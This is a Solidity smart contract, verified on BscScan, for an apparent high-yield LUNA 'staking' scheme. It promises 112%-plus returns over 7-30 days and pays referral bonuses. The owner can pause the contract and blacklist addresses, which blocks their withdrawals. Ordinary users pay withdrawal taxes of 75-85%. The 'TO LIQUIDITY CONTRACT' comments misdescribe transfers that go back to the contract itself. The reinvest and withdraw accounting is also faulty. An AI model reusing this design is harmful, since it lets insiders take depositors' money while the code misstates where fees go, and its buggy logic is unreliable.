/**
 *Submitted for verification at BscScan.com on 2022-03-29
*/

// SPDX-License-Identifier: MIT
// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/security/ReentrancyGuard.sol


// OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}

// File: contracts/LUNAStaking1.sol

/**
 *Submitted for verification at BscScan.com on 2022-01-09
*/


pragma solidity ^0.8.7;


interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    
    function balanceOf(address account) external view returns (uint256);

    
    function transfer(address recipient, uint256 amount) external returns (bool);

    
    function allowance(address owner, address spender) external view returns (uint256);

    
    function approve(address spender, uint256 amount) external returns (bool);

    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {
    
    function isContract(address account) internal view returns (bool) {
        
        
        

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        
        
        
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        
        
        

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}



struct Tarif {
  uint8 life_days;
  uint8 percent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint40 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 reinvest;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[3] structure; 
  uint256 checkpoint;
  
}

contract LUNAStaking is ReentrancyGuard, Ownable {
	using SafeMath for uint256;
	using SafeMath for uint40;
    using SafeERC20 for IERC20;

    uint16 constant BONUS_LINES_COUNT = 1;
    uint16 constant PERCENT_DIVIDER = 1000;

    uint constant internal WEEK = 7 days;
	uint constant internal WITHDRAW_PER_WEEK = 1016 ether; //  100.000 usd

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 public totalReinvested;

    uint256 constant public  TIME_STEP = 1 days;
	uint256 constant public CEO_FEE = 40; 
    uint256 constant public CEO_TWO_FEE = 20;
    uint256 constant public DEV_FEE = 40;
    uint256 constant public DEV_TWO_FEE = 50;
	
    uint256 constant internal INVEST_MIN_AMOUNT = 0.10 ether; // 10 $
    uint256 constant internal INVEST_MAX_AMOUNT = 101.62 ether; // 10.000 $ 
    
    uint16[BONUS_LINES_COUNT] public ref_bonuses = [10]; 

    IERC20 public LUNA; // LUNA;

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;
    mapping(address => bool) public blackList;
 
	address payable public ceoWallet;
    address payable public ceoWalletTwo;
    address payable public devWallet; 
    address payable public devWalletTwo;
	address payable public marketing;

    bool private _paused;
  
    event Paused(address account);
    event Unpaused(address account);
    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }

    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

        constructor(address payable _ceoAddr,
            address payable _ceoTwoAddr,
            address payable _devWallet,
            address payable _devWalletTwo,
            address payable _marketing
        ){
        require(!isContract(_ceoAddr) &&
                !isContract(_ceoTwoAddr) &&
                !isContract(_devWallet) &&
                !isContract(_devWalletTwo) &&
                !isContract(_marketing)
        );

		ceoWallet = _ceoAddr;
        ceoWalletTwo = _ceoTwoAddr;
        devWallet = _devWallet;
        devWalletTwo = _devWalletTwo;
		marketing = _marketing;
        _paused = false;

        uint8 tarifPercent = 112; 
        for (uint8 tarifDuration = 7; tarifDuration <= 30; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 5;
        }
        LUNA = IERC20(0x156ab3346823B651294766e23e6Cf87254d68962);  //   LUNA BSC

    }

    function paused() public view virtual returns (bool) {
        return _paused;
    }

    function _pause() external virtual whenNotPaused onlyOwner{
        _paused = true;
        emit Paused(msg.sender);
    }

    function _unpause() external virtual whenPaused onlyOwner{
        _paused = false;
        emit Unpaused(msg.sender);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != ceoWallet) {
            if(players[_upline].deposits.length == 0) {
                _upline = marketing;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline, uint256 amount) external nonReentrant whenNotPaused{
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(amount >= INVEST_MIN_AMOUNT, "Minimum deposit amount incorrect");
        require(amount <= INVEST_MAX_AMOUNT, "Maximum deposit amount incorrect");
        require(amount <= LUNA.allowance(msg.sender, address(this)));

        LUNA.safeTransferFrom(msg.sender, address(this), amount);
        Player storage player = players[msg.sender];
        require(player.deposits.length < 100, "Max 100 deposits per address");

        uint256 ceo = amount.mul(CEO_FEE).div(PERCENT_DIVIDER);
        uint256 ceoTwo = amount.mul(CEO_TWO_FEE).div(PERCENT_DIVIDER);
        uint256 dev = amount.mul(DEV_FEE).div(PERCENT_DIVIDER);
        
		
		LUNA.safeTransfer(ceoWallet, ceo);
        LUNA.safeTransfer(ceoWalletTwo, ceoTwo);
        LUNA.safeTransfer(devWallet, dev);
        
       
		emit FeePayed(msg.sender, ceo.add(ceoTwo).add(dev));


        if (player.deposits.length == 0) {
            player.checkpoint = block.timestamp;

            if( msg.sender != ceoWallet &&
                msg.sender != ceoWalletTwo &&
                msg.sender != devWallet && 
                msg.sender != devWalletTwo)
            {

                // TAX APPLIED ON FIRST DEPOSIT ONLY 10%
                 uint256 tax = amount.mul(100).div(PERCENT_DIVIDER); 
                amount = amount.sub(tax);

                // TO LIQUIDITY CONTRACT
                LUNA.safeTransfer(address(this), tax);
            }
        }

        _setUpline(msg.sender, _upline, amount);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: amount,
            time: uint40(block.timestamp)
        }));

        player.total_invested+= amount;
        invested+= amount;

        _refPayout(msg.sender, amount);
        
        emit NewDeposit(msg.sender, amount, _tarif);
    }

    function reinvest(uint8 _tarif, uint256 _amount) public whenNotPaused nonReentrant{
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        uint256 totalAmount = player.dividends; 

        uint256 referralBonus = player.match_bonus; 

        if (referralBonus > 0) {
            player.match_bonus = 0;
            totalAmount = totalAmount.add(referralBonus);
        }

        require(totalAmount > 0, "User has no dividends");

        uint256 total = totalAmount - _amount; 

        require(_amount <= totalAmount, "The amount to reinvest it have to be lower");
        require(_amount >= INVEST_MIN_AMOUNT, "The amount to reinvest it have to be greater");

        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        
        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: _amount,
            time: uint40(block.timestamp)
        }));

        
        player.reinvest += _amount;
        totalReinvested += _amount;
        player.dividends -= total;
        player.total_withdrawn += _amount;
        withdrawn += _amount;

       emit NewDeposit(msg.sender, _amount, _tarif);
    }
    
    function withdraw(uint256 _amount) external whenNotPaused {
 
        Player storage player = players[msg.sender];

       require(
          player.checkpoint.add(TIME_STEP) < block.timestamp,
           "Not yet..."
       );

        require(!blackList[msg.sender], "Not allowed");

        uint date = player.checkpoint;
		uint deltaTime = block.timestamp.sub(date);
		uint256 amountAvailableToWithdraw = WITHDRAW_PER_WEEK.mul(deltaTime).div(WEEK);   

        require(_amount <= amountAvailableToWithdraw, "Withdraw: the amount is incorrect");
       
        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 balance = player.dividends + player.match_bonus;

        require(_amount <= balance, "Introduce a lower amount to withdraw");

        uint256 amountWithdraw = _amount;

        if( msg.sender != ceoWallet &&
                msg.sender != ceoWalletTwo &&
                msg.sender != devWallet && 
                msg.sender != devWalletTwo)
        {

            uint256 contractBalance = getContractBalance();

            uint256 tax;
            uint256 taxA;
            uint256 tax_s;

            if(contractBalance <=  1016 ether) {
                tax_s = 500;
            } else{
                tax_s = 400;
            } 


            taxA = tax_s.add(350);  

            tax = _amount.mul(taxA).div(PERCENT_DIVIDER);  

           _amount = _amount.sub(tax);  

           uint256 tax_to_contract = tax.mul(tax_s).div(PERCENT_DIVIDER);  

           uint256 tax3 = tax.mul(30).div(PERCENT_DIVIDER);  
           uint256 tax6 = tax.mul(60).div(PERCENT_DIVIDER);  
           uint256 tax23 = tax.mul(230).div(PERCENT_DIVIDER);

           emit FeePayed(msg.sender, tax);

            // TO LIQUIDITY CONTRACT
            LUNA.safeTransfer(address(this), tax_to_contract);
            LUNA.safeTransfer(address(this), tax23);

            LUNA.safeTransfer(ceoWallet, tax3);
            LUNA.safeTransfer(ceoWalletTwo, tax3);
            LUNA.safeTransfer(devWalletTwo, tax6);
        }

        player.dividends -= amountWithdraw > player.match_bonus ? amountWithdraw - player.match_bonus : player.match_bonus - amountWithdraw;
        player.match_bonus = 0;
        player.total_withdrawn += amountWithdraw;
        withdrawn += amountWithdraw;

       
        player.checkpoint = block.timestamp;
        LUNA.safeTransfer(msg.sender, _amount);

        emit Withdraw(msg.sender, amountWithdraw);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to.sub(from)) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }

    function userInfoRefer(address _addr) view public returns(uint256[BONUS_LINES_COUNT] memory structure){
        Player memory player = players[_addr];

         for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
            structure[i] = player.structure[i];
        }
        return structure;
    }
   
    function userInfo(address _addr) view external returns(uint256 for_withdraw,
     uint256 total_invested,
     uint256 total_reinvest,
      uint256 total_withdrawn,
       uint256 total_match_bonus,
        uint256 checkpoint) {

        Player memory player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.reinvest,
            player.total_withdrawn,
            player.total_match_bonus,
            player.checkpoint
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus, uint256 _reinvestAmount) {
        return (invested, withdrawn, match_bonus, totalReinvested);
    }

    function donations(uint256 amount) external {
        LUNA.safeTransferFrom(msg.sender, address(this), amount);
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function getContractBalance() public view returns (uint256) {
		return LUNA.balanceOf(address(this));
	}

    function addToBlackList(address _addr) external onlyOwner{
        blackList[_addr] = true;
    }

    function removeFromBlackList(address _addr) external onlyOwner{
        blackList[_addr] = false;
    }

    function getUserMaxProfit(address _addr) public view returns(uint) {
        Player memory player = players[_addr];
		uint date = player.checkpoint;
		uint deltaTime = block.timestamp.sub(date);
		return WITHDRAW_PER_WEEK.mul(deltaTime).div(WEEK);
	}
}